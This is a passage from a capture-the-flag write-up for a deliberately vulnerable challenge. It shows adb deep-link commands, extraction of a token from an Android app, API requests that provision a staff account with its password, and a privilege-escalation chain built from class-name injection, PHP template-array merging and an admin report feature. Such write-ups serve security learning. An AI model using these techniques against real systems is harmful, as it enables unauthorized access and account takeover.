getIntent().getData().getQueryParameter(\"start\");\n  if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) {\n\tstr = sharedPreferences.getString(\"USERNAME\", \"\");\n\tSharedPreferences.Editor editor = sharedPreferences.edit();\n\tString str1 = sharedPreferences.getString(\"TWITTERHANDLE\", \"\");\n\teditor.putString(\"PARTONE\", \"COMPLETE\").apply();\n\tlogFlagFound(str, str1);\n\tstartActivity(new Intent((Context)this, PartTwoActivity.class));\n  } \n} \n```\n\nNot having developed for Android ever before, it wasn't completely obvious what this is doing until I googled for `getIntent()` and deep links. The official guide on [Deep Links](https://developer.android.com/training/app-links/deep-linking) explains it all very well. In particular, [Test your deep links](https://developer.android.com/training/app-links/deep-linking#testing-filters) section is exactly what we're after since it allows us to send a deep link to the app via `adb`.\n\nWe can see the intents that the app has defined within `AndroidManifest.xml`:\n```xml\n\u003cactivity android:label=\"@string/title_activity_part_one\" android:name=\"bounty.pay.PartOneActivity\" android:theme=\"@style/AppTheme.NoActionBar\"\u003e\n    \u003cintent-filter android:label=\"\"\u003e\n        \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n        \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n        \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n        \u003cdata android:host=\"part\" android:scheme=\"one\"/\u003e\n    \u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\n\nThe key part here is `\u003cdata android:host=\"part\" android:scheme=\"one\"/\u003e` which gives us the scheme and host to use in the URL, as well as `\u003caction android:name=\"android.intent.action.VIEW\"/\u003e` which is the intent name. From Java source code we see that it wants URl to have a `start` query string parameter, equal to `PartTwoActivity`, so the command we run in `adb` is:\n\n```bash\n$ adb shell am start -W -a android.intent.action.VIEW -d \"one://part/?start=PartTwoActivity\" bounty.pay\nStarting: Intent { act=android.intent.action.VIEW dat=one://part/?start=PartTwoActivity pkg=bounty.pay }\nStatus: ok\nActivity: bounty.pay/.PartOneActivity\nThisTime: 883\nTotalTime: 883\nWaitTime: 893\nComplete\n```\n\n### Android | PartTwoActivity\n\nThis moves us to the next screen, where the hints are `currently invisible` and `visible with the right params`, and nothing further visible on screen.\n\nLooking at the java source code for `PartTwoActivity.java` we see:\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  Uri uri = getIntent().getData();\n  String str1 = uri.getQueryParameter(\"two\");\n  String str2 = uri.getQueryParameter(\"switch\");\n  if (str1 != null \u0026\u0026 str1.equals(\"light\") \u0026\u0026 str2 != null \u0026\u0026 str2.equals(\"on\")) {\n\teditText.setVisibility(0);\n\tbutton.setVisibility(0);\n\ttextView.setVisibility(0);\n  } \n} \n```\nand the corresponding intent defined within `AndroidManifest.xml`:\n```xml\n\u003cactivity android:label=\"@string/title_activity_part_two\" android:name=\"bounty.pay.PartTwoActivity\" android:theme=\"@style/AppTheme.NoActionBar\"\u003e\n    \u003cintent-filter android:label=\"\"\u003e\n        \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n        \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n        \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n        \u003cdata android:host=\"part\" android:scheme=\"two\"/\u003e\n    \u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\nSo similar to the first step I crafted the following deep link and sent it to the app:\n```bash\n$ adb shell am start -W -a android.intent.action.VIEW -d \"two://part/?two=light\u0026switch=on\" bounty.pay\n/system/bin/sh: bounty.pay: not found\nStarting: Intent { act=android.intent.action.VIEW dat=two://part/?two=light }\nStatus: ok\nActivity: bounty.pay/.PartTwoActivity\nThisTime: 368\nTotalTime: 368\nWaitTime: 384\nComplete\n```\nWhich failed... you can see it only sent first parameter, and also there was an error that a package was not found. It was easy enough to find the [answer](https://stackoverflow.com/a/35645448/5540279) on stackoverflow, and the issue was that `\u0026` needs to be escaped with `\\` (or alternatively one could wrap the shell command in single quotes):\n```bash\n$ adb shell am start -W -a android.intent.action.VIEW -d \"two://part/?two=light\\\u0026switch=on\" bounty.pay\nStarting: Intent { act=android.intent.action.VIEW dat=two://part/?two=light\u0026switch=on pkg=bounty.pay }\nStatus: ok\nActivity: bounty.pay/.PartTwoActivity\nThisTime: 241\nTotalTime: 241\nWaitTime: 258\nComplete\n```\n\nWe're now presented with an input field where we need to guess a Header value, which would be checked against Firebase:\n{F862915}\n\nSince I already read the entire source code I knew the answer for it. Within `PartThreeActivity.java` we see the following line:\n```java\nbyte[] decodedDirectoryTwo = Base64.decode(\"WC1Ub2tlbg==\", 0);\n```\nWhen decoded, this value is `X-Token`, and that's exactly the header value we need to enter. You can also see an MD5 hash on the screen, `459a6f79ad9b13cbcb5f692d2cc7a94d`. Googling this value tells us that this is the hash for the word `Token`. It was hinting at the fact that the Header of interest is `X-Token`.\n\nWhen I tried it, it didn't work. Checking the process log within Android Studio, I saw:\n```\nCaused by: javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.\n```\nThis was clearly caused by intercepting traffic with Burp proxy. I simply turned off the proxy and it worked. There surely must have been a way to resolve certificate issues, but intercepting traffic wasn't necessary at all for this challenge, so I went with the easy route. With that issue resolved, submitting`X-Token` as the Header value moves us to the next activity:\n\n### Android | PartThreeActivity\n\nWe again see the blank screen with hints: `Reuse some params.` and `Intercept or check for leaks.`\n\nBased on the java code, at the start of this activity the app should have authenticated anonymously with Firebase and fetched the values for Token and Host and saved them to a local preferences file:\n```java\nHandler handler = new Handler();\nhandler.postDelayed(new Runnable() {\n      public void run() {\n        Log.i(\"TAG\", \"Starting authentication\");\n        PartThreeActivity.this.signIn();\n      }\n    }10000L);\nhandler.postDelayed(new Runnable() {\n      public void run() {\n        Log.i(\"TAG\", \"Getting host endpoint\");\n        PartThreeActivity.this.getHost();\n      }\n    }20000L);\nhandler.postDelayed(new Runnable() {\n      public void run() {\n        Log.i(\"TAG\", \"Getting Token\");\n        PartThreeActivity.this.getToken();\n      }\n    }20000L);\n```\n```java\nprivate void signIn() {\n  this.mAuth = FirebaseAuth.getInstance();\n  this.mAuth.signInAnonymously().addOnCompleteListener((Activity)this, new OnCompleteListener\u003cAuthResult\u003e() {\n        public void onComplete(Task\u003cAuthResult\u003e param1Task) {\n          if (param1Task.isSuccessful()) {\n            Log.d(\"TAG\", \"signInAnonymously:success\");\n            PartThreeActivity.this.mAuth.getCurrentUser();\n            return;\n          } \n          Log.w(\"TAG\", \"signInAnonymously:failure\", param1Task.getException());\n          Toast.makeText((Context)PartThreeActivity.this, \"Authentication failed.\", 0).show();\n        }\n      });\n}\nprivate void getHost() {\n  final SharedPreferences.Editor editor = getSharedPreferences(\"user_created\", 0).edit();\n  this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {\n        public void onCancelled(DatabaseError param1DatabaseError) {\n          Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n        }\n\n        public void onDataChange(DataSnapshot param1DataSnapshot) {\n          String str = (String)param1DataSnapshot.getValue();\n          editor.putString(\"HOST\", str).apply();\n        }\n      });\n}\n  \nprivate void getToken() {\n  final SharedPreferences.Editor editor = getSharedPreferences(\"user_created\", 0).edit();\n  this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {\n        public void onCancelled(DatabaseError param1DatabaseError) {\n          Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n        }\n\n        public void onDataChange(DataSnapshot param1DataSnapshot) {\n          String str = (String)param1DataSnapshot.getValue();\n          editor.putString(\"TOKEN\", str).apply();\n        }\n      });\n}\n```\nBut that didn't actually happen. Checking the app logs with `adb logcat` (or better - Android Studio provides a handy `Logcat` tool window) I noticed that it could not authenticate with Firebase:\n\n```\nbounty.pay W/DynamiteModule: Local module descriptor class for com.google.firebase.auth not found.\nbounty.pay W/GooglePlayServicesUtil: Google Play services out of date.  Requires 12451000 but found 11947470\n```\nThis was because I was running Android 7.1.1 Nougat in my emulator. I probably could have upgraded Google Play, but instead I just installed 9.0 Pie SDK and launched another device. Note: you need a device with Google Play pre-installed - only some are.\n\nAfter re-doing all the steps, I saw in logcat that everything went smoothly:\n```\nbounty.pay I/TAG: Starting authentication\nbounty.pay D/TAG: signInAnonymously:success\nbounty.pay I/TAG: Getting host endpoint\nbounty.pay I/TAG: Getting Token\n```\n\nWe can now retrieve the secret values from the local storage:\n```bash\n$ adb shell\ngeneric_x86_arm:/ $ run-as bounty.pay\ngeneric_x86_arm:/data/data/bounty.pay $ cd shared_prefs/\ngeneric_x86_arm:/data/data/bounty.pay/shared_prefs $ cat user_created.xml\n\u003c?xml version='1.0' encoding='utf-8' standalone='yes' ?\u003e\n\u003cmap\u003e\n    \u003cstring name=\"USERNAME\"\u003enirvana_msu\u003c/string\u003e\n    \u003cstring name=\"PARTTWO\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"HOST\"\u003ehttp://api.bountypay.h1ctf.com\u003c/string\u003e\n    \u003cstring name=\"PARTONE\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"TWITTERHANDLE\"\u003enirvana_msu\u003c/string\u003e\n    \u003cstring name=\"TOKEN\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/string\u003e\n\u003c/map\u003e\n```\n\nAt this stage we could have just moved on to the next part (back to web) of the CTF but I wanted to follow through the designed challenges to the end.\n\nWe need to send another deep link. Relevant code from `PartThreeActivity.java`:\n\n```java\nif (getIntent() != null \u0026\u0026 getIntent().getData() != null) {\n  Uri uri = getIntent().getData();\n  final String firstParam = uri.getQueryParameter(\"three\");\n  final String secondParam = uri.getQueryParameter(\"switch\");\n  final String thirdParam = uri.getQueryParameter(\"header\");\n  byte[] arrayOfByte2 = Base64.decode(str1, 0);\n  byte[] arrayOfByte1 = Base64.decode(str2, 0);\n  final String decodedFirstParam = new String(arrayOfByte2, StandardCharsets.UTF_8);\n  final String decodedSecondParam = new String(arrayOfByte1, StandardCharsets.UTF_8);\n  this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {\n        public void onCancelled(DatabaseError param1DatabaseError) {\n          Log.e(\"TAG\", \"onCancelled\", (Throwable)param1DatabaseError.toException());\n        }\n        \n        public void onDataChange(DataSnapshot param1DataSnapshot) {\n          String str = (String)param1DataSnapshot.getValue();\n          if (firstParam != null \u0026\u0026 decodedFirstParam.equals(\"PartThreeActivity\") \u0026\u0026 secondParam != null \u0026\u0026 decodedSecondParam.equals(\"on\")) {\n            String str1 = thirdParam;\n            if (str1 != null) {\n              StringBuilder stringBuilder = new StringBuilder();\n              stringBuilder.append(\"X-\");\n              stringBuilder.append(str);\n              if (str1.equals(stringBuilder.toString())) {\n                editText.setVisibility(0);\n                button.setVisibility(0);\n                PartThreeActivity.this.thread.start();\n              } \n            } \n          } \n        }\n      });\n} \n```\nAnd intent declaration from  `AndroidManifest.xml`:\n```xml\n\u003cactivity android:label=\"@string/title_activity_part_three\" android:name=\"bounty.pay.PartThreeActivity\" android:theme=\"@style/AppTheme.NoActionBar\"\u003e\n    \u003cintent-filter android:label=\"\"\u003e\n        \u003caction android:name=\"android.intent.action.VIEW\"/\u003e\n        \u003ccategory android:name=\"android.intent.category.DEFAULT\"/\u003e\n        \u003ccategory android:name=\"android.intent.category.BROWSABLE\"/\u003e\n        \u003cdata android:host=\"part\" android:scheme=\"three\"/\u003e\n    \u003c/intent-filter\u003e\n\u003c/activity\u003e\n```\nBased on the above I crafted the next deep link:\n```\n$ adb shell am start -W -a android.intent.action.VIEW -d \"three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\\\u0026switch=b24=\\\u0026header=X-Token\" bounty.pay\nStarting: Intent { act=android.intent.action.VIEW dat=three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\u0026switch=b24=\u0026header=X-Token pkg=bounty.pay }\nStatus: ok\nActivity: bounty.pay/.PartThreeActivity\nThisTime: 224\nTotalTime: 224\nWaitTime: 253\nComplete\n```\nThis reveals the input to submit the leaked hash:\n{F862959}\n\nI entered the token `8e9998ee3137ca9ade8f372739f062c1` and was presented with the final screen, confirming that Android challenges were complete. There was also a rather obvious message that `Information leaked here will help with other challenges.`:\n{F862964}\n\n## Social Media\n\nOk, so from the whole of Android challenge, we understood that we could use the header `X-Token: 8e9998ee3137ca9ade8f372739f062c1` with the host `http://api.bountypay.h1ctf.com`.\n\nAnd indeed we can confirm it works as authentication for the API endpoints:\n\n```http\nGET /api/accounts/F8gHiqSdpK/statements?month=05\u0026year=2020 HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"description\":\"Transactions for 2020-05\",\"transactions\":[]}\n```\n\nGreat. But what does it really give us? We could have already made GET requests via SSRF. What we can do now that we could not do with SSRF is make POST requests, so that must be the next step we're looking for.\n\nEndpoints known to us so far under `/api` did not respond to POST requests - so it's time for Content Discovery again. I've fired a bruteforce to look for new endpoints that respond to POST (as we'll see later, GET would have worked as well) and after a bit I found the new endpoint:\n\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n```http\nHTTP/1.1 400 Bad Request\nContent-Type: application/json\n\n[\"Missing Parameter\"]\n```\nSo we're missing some parameter. Checking the GET request for the same endpoint:\n```http\nGET /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n```\nwe see a new parameter, `staff_id`. Back to the POST endpoint, trying one of those staff ids gives us:\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\nstaff_id=STF:KE624RQ2T9\n```\n```http\nHTTP/1.1 409 Conflict\nContent-Type: application/json\n\n[\"Staff Member already has an account\"]\n```\nHTTP Code [`409 Conflict`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/409) implies that the endpoint is supposed to create something. Together with the message it becomes fairly clear that the endpoint should be used to provision a new account for a staff member. The only two staff ids we have from the GET request give us same message. Entering an invalid value just results in the message `[\"Invalid Staff ID\"]`.\n\nI recalled seeing a [BountypayHQ](https://twitter.com/BountypayHQ) Twitter account earlier in my twitter feed - several people retweeted / liked some tweets.There was a [tweet](https://twitter.com/BountypayHQ/status/1258692286256500741) saying `Today we welcome Sandra to the team!!!`. \n\nThat sounds a lot like we have to find a staff id for that Sandra person, but this is actually where I got stuck. Somehow it didn't occur to me to check Twitter followers so I went on to try loads of different things:\n\n  * Earlier I saw another Twitter account, [BountypayH](https://twitter.com/BountypayH) which had a tweet saying `Always check for SQLi`. Back then I didn't realise it was just a troll, so I went ahead and fired sqlmap at every endpoint I could think of. I even tried looking for injections within session's JSON payload. That didn't yield anything, but at least I leaned some new sqlmap tricks..\n  * `Sam Jenkins`, the name of the other staff member, could have possibly hinted at the fact that we need to find a Jenkins instance somewhere? There's no such subdomain, and unclear where else we could look for it. I tried checking a few endpoints on `software` subdomain but this was a dead-end,\n  * I tried to decrypt session hash, or craft another hash based on the account information for Sam, but it did not lead anywhere at all.\n  * I tried to forge session cookie for `staff` subdomain, assuming it follows same structure/principles as the cookie of `app` subdomain - another dead end.\n  * I recalled that `staff` subdomain was also whitelisted for redirect, so we could access it via SSRF. Maybe there's something on it that we could only access via SSRF? I did a bruteforce on available templates and found new ones such as `ticket` and `admin`. [Admin template](https://staff.bountypay.h1ctf.com/?template=admin) responded with a message `No Access to this resource`. I tried it via SSRF but it still responded with same message.\n  * Tried bruteforcing Sam's password on both `app` and `staff` subdomain - no luck.\n\nAfter banging my head against the wall with all those dead ends  I reached out to [@bbuerhaus](https://twitter.com/bbuerhaus) to bounce my ideas, who confirmed I was on the right track with finding Sandra's staff id, and it wasn't long before I found [Sandra's](https://twitter.com/SandraA76708114) twitter account among both [following](https://twitter.com/BountypayHQ/following) and [followers](https://twitter.com/BountypayHQ/followers) lists for BountypayHQ, and in her timeline I saw [this tweet](https://twitter.com/SandraA76708114/status/1258693001964068864) with a photo featuring her staff access card that shows her Staff ID: `STF:8FJ3KFISL3`. Yay!\n\nFinally I issued the `POST` request to `/api/staff` with Sandra's Staff ID, and surely enough it provisioned a new account for Sandra and gave us the credentials that we could use to login to Staff  portal at `staff.bountypay.h1ctf.com`:\n\n```http\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\n```\n\n```http\nHTTP/1.1 201 Created\nContent-Type: application/json\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n## Privilege Escalation\n\nLogging in to Staff portal as Sandra and looking through all HTML and JS sources I noted the following things:\n\n1. Session cookie was no longer a base64-encoded JSON. It couldn't be decrypted - or not easily, at least.\n2. There is functionality to change `profile_name` and `profile_avatar`, but in both cases every special character is removed, so looks like XSS is not an option.\n3. Javascript code looked extremely interesting:\n\n\t```http\n\tGET /js/website.js HTTP/1.1\n\tHost: staff.bountypay.h1ctf.com\n\tCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\t```\n\n\t```js\n\t$(\".upgradeToAdmin\").click(function() {\n\t\tlet t = $('input[name=\"username\"]').val();\n\t\t$.get(\"/admin/upgrade?username=\" + t, function() {\n\t\t\talert(\"User Upgraded to Admin\")\n\t\t})\n\t}), $(\".tab\").click(function() {\n\t\treturn $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n\t}), $(\".sendReport\").click(function() {\n\t\t$.get(\"/admin/report?url=\" + url, function() {\n\t\t\talert(\"Report sent to admin team\")\n\t\t}), $(\"#myModal\").modal(\"hide\")\n\t}), document.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n\t````\n\tSeveral things I noted here: \n\t   * Issuing a request to `/admin/upgrade?username=` is likely the goal of this challenge, as this should escalate our privileges to Admin.\n\t   * There is a functionality to \"send a report\" to Admin team. \n\t   * We can use `#tab1` ... `#tab4` in URL to invoke a click on the tab on page load.\n\t   * There was no element with class`tab4` on the page (only `tab1`, `tab2`, `tab3`), which was interesting. \n4. The \"send report\" functionality is clarified in the HTML code:\n\t\u003e Is there something wrong with this page? If so hit the \"Report Now\" button and the page will be sent over to our admins to checkout.\n\t\u003e Pages in the /admin directory will be ignored for security\n5. There is a second endpoint, `/?template=ticket\u0026ticket_id=3582`, where `profile_name` and `profile_avatar`are reflected as well. It shows a message from Admin to Sandra.\n6. Within both HTML pages we observe code like\n\t```html\n\t\u003cscript\u003e\n\t    var url = 'Lz90ZW1wbGF0ZT1ob21l';\n\t\u003c/script\u003e\n\t```\n\tThe value here is the base64-encoded URL path, in this case it is `/?template=home`. This is the value sent when reporting a page, meaning we can report an arbitrary page to Admin by encoding the URL path with base64.\n\nFirst thing I tried was to hit the priv esc endpoint directly:\n\n```http\nGET /admin/upgrade?username=sandra.allison HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n```\n```http\nHTTP/1.1 401 Unauthorized\nContent-Type: application/json\n\n[\"Only admins can perform this\"]\n```\n\nOk, so it's fairly clear that our goal to make Admin issue this GET request for us, and this is exactly what the functionality to report the page is for. My next attempt was to report this endpoint, so that Admin would visit it. Encoding `/admin/upgrade?username=sandra.allison`gives us `L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24=`, but reporting this page results in same response as reporting any other page:\n```http\nGET /admin/report?url=L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nX-Requested-With: XMLHttpRequest\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n```\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n[\"Report received\"]\n```\nThis is expected, given we were told that `Pages in the /admin directory will be ignored for security`.\n\nAt this point I went the wrong way and tried loads of different things, all leading to a dead end:\n\n* I tried to see if Admin would access an external URL, such as Burp Collaborator. I tried a number of tricks that wold normally be used for an Open Redirect bypass, but none worked.\n* I though that  `Pages in the /admin directory will be ignored for security` message could be quite literal - maybe there's e.g .a regex check that a path starts with `/admin` that could be bypassed. I tried a number of things like path traversal, using `\\` instead of `/` etc but nothing worked.\n* By this point I still didn't realize SQLi hint was a troll, so I fired up sqlmap again. I've even tried injections within the reported pages - in case something worked differently for Admin than for us.\n* The support ticket functionality reminded me of [Ticket Trick](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c), so I tried sending a few emails to addresses like `support@staff.bountypay.h1ctf.com` - all bounced back.\n* We don't have XSS with `profile_name` and `profile_avatar` parameters, but maybe we have [SSTI](https://portswigger.net/research/server-side-template-injection)? Curly braces were filtered out as well..\n\nI was clearly going down the rabbit hole, especially with that SQLi trolling, so I pinged [@xEHLE_](https://twitter.com/xEHLE_) for a reality check, and he confirmed that I was on the right path originally with trying to make Admin visit the priv esc endpoint, and that I was just overlooking something in the javascript code. And indeed, looking more closely at the jQuery selectors I realised they were too loose and just selected the element(s) based on a class name, and not id: `$(\".upgradeToAdmin\").click`.\n\nThe pieces of the puzzle immediately came together. Coincidentally, we have control of the class name via `profile_avatar` parameter. Coupled with the `#tab4` we can make Admin issue the request to the priv esc endpoint without any interaction! The steps that had to be taken are thus:\n\n1. Change our `profile_avatar` to `upgradeToAdmin tab4`. `tab4` class (together with `#tab4` in the URL) is needed so that the element would be clicked on, and `upgradeToAdmin` class ensures the desired jQuery callback would fire.\n2. `profile_avatar`is reflected within our home page, but it's of no use to us since when Admin access the reported page, it would show his details and not ours. We need a page where Admin user would still have our `profile_avatar` reflected, and that's exactly the ticket page!\n3. We thus report `/?template=ticket\u0026ticket_id=3582#tab4`, which base64-encoded is `Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA==`:\n\n```http\nGET /admin/report?url=Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA== HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\n```\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n[\"Report received\"]\n```\n\nNot so fast. We got half-way there, and we seem to be on the right track, but look again at the JS code:\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n\tlet t = $('input[name=\"username\"]').val();\n\t$.get(\"/admin/upgrade?username=\" + t, function() {\n\t\talert(\"User Upgraded to Admin\")\n\t})\n})\n```\nThere is no input with name `username` anywhere on the ticket page, so the request that Admin sends is actually`/admin/upgrade?username=undefined` (which can be confirmed by visiting our crafted URL directly in the browser).\n\nAt this point it didn't seem possible to me to influence the request any further so I went down a few more rabbit holes, including searching for SQLi again. This is finally when [@bbuerhaus](https://twitter.com/bbuerhaus) told me that there is no SQLi in this CTF and that it was just a troll :doh:, and that I should continue focusing on getting the admin to issue the request with desired `username`.\n\nOk, so we need an input with name `username` then. And it finally struck me that there is indeed one such input - back at the login page. This is when the second stage of the puzzle came together for me. Recall that we're dealing with PHP - where we can turn any parameter we submit in our request into an array by simply doing `?param[]=1\u0026param[]=2`. It's finally clear why the URL routing was using this awkward syntax: `/?template=home`.\n\nI immediately tried turning template parameter into an array, in the hope that the backend would merge the two templates - and it did! Note the second `\u003c!DOCTYPE html\u003e` in the middle. followed by the second template:\n\n```http\nGET /?template[]=ticket\u0026ticket_id=3582\u0026template[]=login\u0026username=sandra.allison HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\n```\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eBountyPay Staff Portal\u003c/title\u003e\n    \u003clink href=\"/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\n    \u003clink href=\"/css/style.css\" rel=\"stylesheet\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\u003cnav class=\"navbar navbar-inverse navbar-fixed-top\"\u003e\n    \u003cdiv class=\"container\"\u003e\n        \u003cdiv class=\"navbar-header\"\u003e\n            \u003cbutton type=\"button\" class=\"navbar-toggle collapsed\" data-toggle=\"collapse\" data-target=\"#navbar\" aria-expanded=\"false\" aria-controls=\"navbar\"\u003e\n                \u003cspan class=\"sr-only\"\u003eToggle navigation\u003c/span\u003e\n                \u003cspan class=\"icon-bar\"\u003e\u003c/span\u003e\n                \u003cspan class=\"icon-bar\"\u003e\u003c/span\u003e\n                \u003cspan class=\"icon-bar\"\u003e\u003c/span\u003e\n            \u003c/button\u003e\n            \u003ca class=\"navbar-brand\" href=\"/\"\u003eBountyPay Staff\u003c/a\u003e\n        \u003c/div\u003e\n        \u003cdiv id=\"navbar\" class=\"collapse navbar-collapse\"\u003e\n            \u003cul class=\"nav navbar-nav navbar-right\"\u003e\n                \u003cli\u003e\u003ca href=\"/logout\"\u003eLogout\u003c/a\u003e\u003c/li\u003e\n            \u003c/ul\u003e\n        \u003c/div\u003e\u003c!--/.nav-collapse --\u003e\n    \u003c/div\u003e\n\u003c/nav\u003e\n\u003cdiv class=\"container\" style=\"margin-top:60px\"\u003e\n    \u003cdiv class=\"row\"\u003e\n\n        \u003cdiv class=\"col-md-8 col-md-offset-2\"\u003e\n\n\n            \u003cdiv class=\"panel panel-default\"\u003e\n                \u003cdiv class=\"panel-heading\"\u003eMessage\u003c/div\u003e\n                \u003cdiv class=\"panel-body\"\u003e\n                    \u003cdiv style=\"width: 100px;position: absolute\"\u003e\n                        \u003cdiv style=\"margin:auto\" class=\"avatar avatar3\"\u003e\u003c/div\u003e\n                        \u003cdiv class=\"text-center\"\u003eAdmin\u003c/div\u003e\n                    \u003c/div\u003e\n                    \u003cdiv\u003e\n                        \u003cdiv class=\"alert alert-info\" style=\"margin-left:100px;min-height:80px\"\u003e\n                            \u003cp\u003eWelcome to the staff portal, This is an automated message to show you what a ticket looks like\u003c/p\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/div\u003e\n\n\n            \u003cdiv class=\"panel panel-default\"\u003e\n                \u003cdiv class=\"panel-heading\"\u003eReply\u003c/div\u003e\n                \u003cdiv class=\"panel-body\"\u003e\n                    \u003cdiv style=\"width: 100px;position: absolute\"\u003e\n                        \u003cdiv style=\"margin:auto\" class=\"avatar 